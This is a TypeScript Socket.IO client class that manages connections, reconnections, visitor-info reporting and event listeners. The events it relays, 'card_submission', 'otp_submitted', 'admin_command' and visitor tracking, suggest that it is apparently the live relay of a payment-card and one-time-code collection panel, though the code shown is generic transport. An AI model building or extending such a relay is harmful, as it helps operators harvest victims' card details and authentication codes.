
import io from 'socket.io-client';

const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
const protocol = window.location.protocol === "https:" ? "https" : "http";

// For production, use the same domain as the current window
const socketUrl = isLocalhost
  ? `${protocol}://localhost:8080`
  : `${window.location.protocol}//${window.location.host}`;

class WSClient {
  private listeners: { [type: string]: Array<(payload: any) => void> } = {};
  socket: any;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 10;
  private isConnecting = false;

  constructor() {
    console.log('[WSClient] Connecting to:', socketUrl);
    this.initSocket();
  }

  private initSocket() {
    if (this.isConnecting) {
      console.log('[WSClient] Already connecting, skipping...');
      return;
    }
    
    this.isConnecting = true;
    
    this.socket = io(socketUrl, { 
      transports: ['polling', 'websocket'],
      timeout: 20000,
      forceNew: false,
      reconnection: true,
      reconnectionDelay: 2000,
      reconnectionDelayMax: 10000,
      reconnectionAttempts: 10,
      upgrade: true,
      autoConnect: true
    });
    
    this.socket.on('connect', () => {
      console.log('[WSClient] Socket.IO connected with ID:', this.socket.id);
      this.reconnectAttempts = 0;
      this.isConnecting = false;
      // Send visitor info when connected
      this.sendVisitorInfo();
    });

    this.socket.on('disconnect', (reason) => {
      console.log('[WSClient] Socket.IO disconnected, reason:', reason);
      this.isConnecting = false;
      
      // Only attempt manual reconnection for certain disconnect reasons
      if (reason === 'io server disconnect') {
        // Server initiated disconnect, try to reconnect
        setTimeout(() => {
          if (!this.socket.connected && this.reconnectAttempts < this.maxReconnectAttempts) {
            console.log('[WSClient] Attempting manual reconnection...');
            this.reconnectAttempts++;
            this.socket.connect();
          }
        }, 5000);
      }
    });

    // Enhanced error handling
    this.socket.on('connect_error', (error: any) => {
      console.error('[WSClient] Socket.IO connection error:', error);
      this.isConnecting = false;
      this.reconnectAttempts++;
      
      if (this.reconnectAttempts < this.maxReconnectAttempts) {
        console.log(`[WSClient] Will retry connection... Attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts}`);
      } else {
        console.error('[WSClient] Max reconnection attempts reached');
        // Reset after a longer delay
        setTimeout(() => {
          this.reconnectAttempts = 0;
          console.log('[WSClient] Resetting reconnection attempts...');
        }, 30000);
      }
    });

    this.socket.on('connect_timeout', () => {
      console.error('[WSClient] Socket.IO connection timeout');
      this.isConnecting = false;
    });

    this.socket.on('error', (error: any) => {
      console.error('[WSClient] Socket.IO error:', error);
    });

    this.socket.on('reconnect', (attemptNumber) => {
      console.log('[WSClient] Socket.IO reconnected after', attemptNumber, 'attempts');
      this.reconnectAttempts = 0;
      this.sendVisitorInfo();
    });

    this.socket.on('reconnect_error', (error) => {
      console.error('[WSClient] Socket.IO reconnection error:', error);
    });

    this.socket.on('reconnect_failed', () => {
      console.error('[WSClient] Socket.IO reconnection failed');
      this.isConnecting = false;
    });

    // Listen for all relayed events
    const RELAY_EVENTS = [
      'card_submission',
      'admin_command',
      'otp_submitted',
      'delete_all_transactions',
      'visitor_update',
      'visitor_left',
      'enhanced_visitor',
      'start_chat',
      'chat_message',
      'submission_received',
      'submission_error'
    ];

    RELAY_EVENTS.forEach((event) => {
      this.socket.on(event, (payload) => {
        console.log(`[WSClient] Received event: ${event}`, payload);
        if (this.listeners[event]) {
          this.listeners[event].forEach((cb) => cb(payload));
        }
      });
    });
  }

  private sendVisitorInfo() {
    const visitorData = {
      ip: 'Unknown', // Will be detected on server
      user_agent: navigator.userAgent,
      device_time: new Date().toLocaleString(),
      timestamp: Date.now()
    };
    
    console.log('[WSClient] Sending visitor info:', visitorData);
    this.send('visitor_connected', visitorData);
  }

  send(type: string, payload: any) {
    if (!this.socket || !this.socket.connected) {
      console.warn('[WSClient] Socket not connected, attempting to reconnect...');
      this.connect();
      // Queue the message for when connection is restored
      setTimeout(() => {
        if (this.socket && this.socket.connected) {
          console.log(`[WSClient] Sending queued event: ${type}`, payload);
          this.socket.emit(type, payload);
        } else {
          console.error('[WSClient] Failed to reconnect, cannot send event:', type);
        }
      }, 3000);
      return;
    }
    
    console.log(`[WSClient] Sending event: ${type}`, payload);
    this.socket.emit(type, payload);
  }

  connect() {
    if (this.socket && !this.socket.connected && !this.isConnecting) {
      console.log('[WSClient] Attempting to connect socket...');
      this.socket.connect();
    } else if (!this.socket) {
      console.log('[WSClient] Reinitializing socket...');
      this.initSocket();
    }
  }

  disconnect() {
    if (this.socket && this.socket.connected) {
      console.log('[WSClient] Disconnecting socket...');
      this.socket.disconnect();
      this.isConnecting = false;
    }
  }

  getSocketId() {
    const id = this.socket?.id;
    console.log('[WSClient] Current socket ID:', id);
    return id;
  }

  isConnected() {
    const connected = this.socket?.connected || false;
    console.log('[WSClient] Connection status:', connected);
    return connected;
  }

  on(type: string, cb: (payload: any) => void) {
    console.log(`[WSClient] Registering listener for ${type}`);
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(cb);
  }

  off(type: string, cb: (payload: any) => void) {
    console.log(`[WSClient] Removing listener for ${type}`);
    if (this.listeners[type]) {
      this.listeners[type] = this.listeners[type].filter((fn) => fn !== cb);
    }
  }
}

export const wsClient = new WSClient();
